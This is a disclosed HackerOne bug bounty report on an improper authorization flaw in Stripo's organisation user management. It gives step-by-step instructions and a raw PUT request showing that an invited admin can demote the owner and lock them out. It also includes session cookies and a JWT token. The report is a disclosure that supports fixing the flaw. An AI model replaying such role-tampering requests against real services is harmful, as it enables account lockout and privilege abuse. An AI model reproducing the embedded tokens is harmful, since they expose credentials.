# Improper Authorization

## Report Details
- **Report ID**: 751299
- **URL**: https://hackerone.com/reports/751299
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-12-04T10:15:52.212Z
- **Disclosed**: 2020-02-03T13:33:07.442Z

## Reporter
- **Username**: abdellah29
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: stripo

## Vulnerability Information
hi there ,

i found an vulnerability on  https://my.stripo.email/cabinet/#/users/orog_id ,

generally every user have an organisation and the organisation contain projects , 

lets suppose : test@gmail.com is the owner of the project

and test2@gmail.com was invited to his project as admin , in normal situation the owner can not be removed even if second account is admin

the issue is i can removed the owned from hi position to admin , and the big problem once the owner is removed he can not login again to his account


## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. you must have 2 account , one owner , the second got invited as admin

  2. log in with your second account and go to https://my.stripo.email/cabinet/#/users/xxxx

       you will see that the input of role is disabled , enable it via inspect element ( f12) , 

then change the role of owner for it to admin , an PUT request will be sent

##http request

PUT /cabinet/stripeapi/v1/organizations/135428/users HTTP/1.1
Host: my.stripo.email
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer null
Content-Type: application/json;charset=UTF-8
Cache-Control: no-cache
Pragma: no-cache
Expires: Sat, 01 Jan 2000 00:00:00 GMT
Content-Length: 231
Origin: https://my.stripo.email
Connection: close
Referer: https://my.stripo.email/cabinet/
Cookie: __stripe_mid=f1a62f3d-2ba4-4742-a1ae-97c309223fec; __stripe_sid=20155b5b-e547-4e52-9c4c-53fd4b08ed8a; _ga=GA1.2.472610903.1575449565; _gid=GA1.2.1705021668.1575449565; _fbp=fb.1.1575449579810.16963820; token=eyJhbGciOiJIUzI1NiJ9.eyJzZWN1cml0eUNvbnRleHQiOiJ7XCJ1c2VySW5mb1wiOntcImlkXCI6MTMwODUxLFwiZW1haWxcIjpcImFiZGVsbGFobmFkaTNAZ21haWwuY29tXCIsXCJsb2NhbGVLZXlcIjpcImVuXCIsXCJmaXJzdE5hbWVcIjpcInRlc3Q0NVwiLFwibGFzdE5hbWVcIjpcIm5cIixcImdhSWRcIjpcImJiYzBkNGExLWI5NDYtNDIwMy1iOTNmLTcxNjhmYmEyMWI5ZVwiLFwicGhvbmVzXCI6W10sXCJhY3RpdmVcIjpmYWxzZSxcImFjdGl2ZVByb2plY3RJZFwiOjEzNzg3NyxcImlzU3VwZXJVc2VyXCI6ZmFsc2UsXCJzdXBlclVzZXJWMlwiOmZhbHNlLFwib25seUZiQ3JlZGVudGlhbHNcIjpmYWxzZSxcInNldHRpbmdzRW1haWxTb3J0QnlcIjpcImNyZWF0ZWRUaW1lXCIsXCJzZXR0aW5nc0VtYWlsU29ydEFzY1wiOmZhbHNlLFwic2V0dGluZ3NUZW1wbGF0ZVNvcnRCeVwiOlwidXBkYXRlZFRpbWVcIixcInNldHRpbmdzVGVtcGxhdGVTb3J0QXNjXCI6ZmFsc2UsXCJjb2xvclwiOlwiI2ZiYTc2ZlwiLFwib3JnYW5pemF0aW9uSWRcIjoxMzA2NjUsXCJzdWJzY3JpcHRpb25UeXBlXCI6XCJGUkVFXCIsXCJjb25zZW50UmVjZWl2ZWRcIjp0cnVlLFwidGVtcGxhdGVDcmVhdGVkT25Mb2dpblwiOmZhbHNlLFwiZmlyc3RMb2dpblwiOmZhbHNlfSxcImlzc3VlZEF0XCI6MTU3NTQ1MDIzMDMxOH0ifQ.GidxPLc4Wu80JWxScUjLrq4nmLr2lEamONcWsATBQfY; intercom-session-b1m243ec=Tlk4aHpydmFMOTc5SlZRaGRabE43WUIwanoxdXAyNlowR3FWbE9oaXNDRm5mYlhRRHNBNjlyLzJOOWQybmtYQi0tZzUrdnd1enBReWhPM0J3M1N2SFIzUT09--a917964bb8221fad0a6d3e38fab8cde2af1efed4

{"repository":{},"idField":"id","entityType":"USER","id":135628,"role":"admin","organizationId":135428,"firstName":"TESt","lastName":"account","color":"#cc90e2","email":"pain45@wearehackerone.com","projectIds":[],"suspended":false} 

##http response :


HTTP/1.1 200 
Server: nginx
Date: Wed, 04 Dec 2019 09:56:41 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
Vary: Accept-Encoding
█████████
████
X-Frame-Options: sameorigin
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 180

█████cc90e2","email":"pain45@wearehackerone.com","projectIds":[],"suspended":false}

i hope it is clear , 

thanks

## Impact

an attacker ( already admin ) can remove the owner from his role , and the last one can not login any more to his account

## Attachments
No attachments
